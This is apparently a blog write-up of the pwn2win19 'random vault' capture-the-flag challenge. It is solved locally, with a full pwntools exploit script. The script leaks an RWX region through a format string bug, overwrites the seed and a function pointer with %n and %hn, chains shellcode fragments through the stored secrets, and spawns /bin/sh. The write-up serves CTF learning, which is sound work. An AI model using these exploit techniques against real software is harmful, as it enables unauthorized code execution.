---
layout: post
title: pwn2win19 - random vault
date: 2019-11-19 00:00:00
categories: 
    - blog
tags:
    - ctf
    - linux
    - x64
    - format string
    - binary exploitation
---

### Sources

[https://github.com/fachrioktavian/ctf-writeup/tree/master/pwn2win19/randomvault](https://github.com/fachrioktavian/ctf-writeup/tree/master/pwn2win19/randomvault)

### Summary

This challenge is from pwn2win19 ctf. I didn't join the ctf. Solve this challenge by scraping for the binary in ctftime and solve it locally.

#### Overview

So the binary is a program which saves datas. The datas then being store on a memory with random address.

```terminal
❯ ./random_vault
Welcome to the Vault!
Username: blabla

=== VAULT ===
Hello, blabla

Actions:
1. Change username
2. Store secret
3. Reset vault
4. Quit

2
Secret #1: 1
Secret #2: 2
Secret #3: 3
Secret #4: 4
Secret #5: 5
Secret #6: 6
Secret #7: 7
You've stored the following secrets:
#1: 1, #2: 2, #3: 3, #4: 4, #5: 5, #6: 6, #7: 7
Keep secret? (y/n) y
Ok! Your data is SAFE.
```

#### The bugs

1. There is format string vulnerability exists on a function that's called to write down username.

    ```c
    unsigned __int64 __fastcall sub_1412(const char *global_buf)
    {
        unsigned __int64 v1; // ST18_8
        v1 = __readfsqword(0x28u);
        printf("Hello, ");
        sub_12BD(1, 2, 3, 4, 5, 6);
        printf(global_buf, 2LL); // format string
        puts(byte_2056);
        return __readfsqword(0x28u) ^ v1;
    }
    ```

#### Exploitation's Scenario

For the first time i thing this is just a straightforward format string challenge. Use the bug to leak some information and then overwrite some pointer to gain shell access, but there are some logic that make it hard to solve:

- we can only run the format string attack twice. First at the start while program runs, second is when we use `change username` function.

    ```c
    if ( qword_4020[a2] == 0x8161412171513111LL ) // check the value
    {
        printf("Username: ");
        fgets(global_buf, 81, stdin);
        global_buf[81] = 0;
        qword_4020[a2] = 0LL; // zeroed buf
    }
    ```

- username's buffer spaces are only 80 bytes so can only do arbitrary write approx 12 bytes using `%hn` format. It's difficult if we want to do multiple read and write at the same time.

The scenario will be:

1. Leaking a RWX regions as program places a function pointer and seed for `store secret`:

    ```c
    srand(seed);
    for ( i = 0; i <= 6; ++i )
    {
        printf("Secret #%d: ", (i + 1));
        v0 = rand();
        secret_array[i] = ((v0 >> 56) + v0) - ((v0 >> 31) >> 24);
        __isoc99_scanf("%llu", &unk_5010 + 8 * secret_array[i]);
    }
    ```

2. Overwriting seed's value to specific value so we can control where to store secret. And fortunately secrets are stored in RWX region, so we can execute it if we inject shellcode.

3. Overwriting function pointer at RWX region so it's pointing to the our shellcode.

### Exploitation

#### Helper

For cleaner exploit script, we use helper function.

```python
def init(r, cnt):
    r.recv()
    r.sendline(cnt)

def change_username(r, cnt):
    r.recv()
    r.sendline("1")
    r.recv()
    r.sendline(cnt)

def store_secret(r, s):
    r.recv()
    r.sendline("2")
    for d in s:
        r.recv()
        r.sendline(d)

r = process("./random_vault", aslr=1)
```

#### Stage 1. Leaking RWX region

Using format string vulnerability to leak the region that has RWX permission.

```python
pload_leak = "%p|"*11
init(r, pload_leak)
d = r.recvuntil("Actions:").split("|")
rwx = int(d[10], 16) + 0x38b0
seed = rwx + 0x8
```

#### Stage 2. Calculating address of secret

After overwriting seed's value to 1 later in stage 3, we can determine where our secret will be stored in memory using dynamic analysis through debugger. Later we will placed our shellcode in the secret variable and chains them with `jmp` instruction so it connects one another (like a linked-list). So to make the shellcode easier, order of shellcode in secret will be places from the lowest to higher memory.

```python
loc = [0x67, 0xc6, 0x69, 0x73, 0x51, 0xff, 0x4a] # shellcode order will be 7, 5, 1, 3, 4, 2, 6
sc_start = rwx + 0x10
sc_loc = []
for i in loc:
    sc_loc.append(sc_start+(8*i))
```

#### Stage 3. Overwriting function pointer and seed value

Using format string vulnerability, overwrite seed's value to 1 and function pointer to point to start of shellcode (secret no #7).

```python
entry = sc_loc[6] & 0xffff
seed_val = 1
z = "%{}c%29$n|%{}c|%30$hn".format(seed_val.__str__(), (entry-seed_val-2).__str__())
pload_z = z.ljust(40, 'A') + p64(seed) + p64(rwx)
change_username(r, pload_z)
```

#### Stage 4. Calculating secret value and storing secret

We build the shellcode to read from stdin and make program run our previous input shellcode from stdin that will call execve("/bin/sh").

```python
c = asm(shellcraft.linux.read('rax', 'rdx', 0x5000))

''' disasm(c)
0:   48 89 c7                mov    rdi,rax
3:   31 c0                   xor    eax,eax # ignored
5:   48 89 d6                mov    rsi,rdx
8:   31 d2                   xor    edx,edx
a:   b6 50                   mov    dh,0x50
c:   0f 05                   syscall
'''

sc_7 = c[0:3:] + "\xeb{}".format(chr(sc_loc[4] - sc_loc[6]- 5))
sc_7 = sc_7.ljust(8, "\x00")
sc_5 = c[5:10:] + "\xe9{}".format(chr(sc_loc[0] - sc_loc[4]- 5 - 5))
sc_5 = sc_5.ljust(8, "\x00")
sc_1 = c[0xa:0xe:] + "\xe9{}".format(chr(sc_loc[2] - sc_loc[0]- 5 - 5 - 6))
sc_1 = sc_1.ljust(8, "\x00")
secret = [str(u64(sc_1)), "0", "0", "0", str(u64(sc_5)), "0", str(u64(sc_7))]
store_secret(r, secret)
```

#### Stage 5. Sending shellcode

```python
s = asm(shellcraft.linux.sh())
r.sendline("B"*0xf1 + s)
```

#### Pwned

```terminal
❯ python solve.py
[+] Starting local process './random_vault': pid 15280
[*] Stage 1 > Leaking RWX region
[+]         > RWX region address: 0x55d1740e6000, seed address: 0x55d1740e6008
[*] Stage 2 > Calculating address of secret
[*] Stage 3 > Overwriting function pointer and seed value
[*] Stage 4 > Calculating secret value and storing secret
[*] Stage 5 > Sending shellcode
[+] Pwn!
[*] Switching to interactive mode
$ uname -a
Linux fokt 5.0.0-31-generic #33~18.04.1-Ubuntu SMP Tue Oct 1 10:20:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
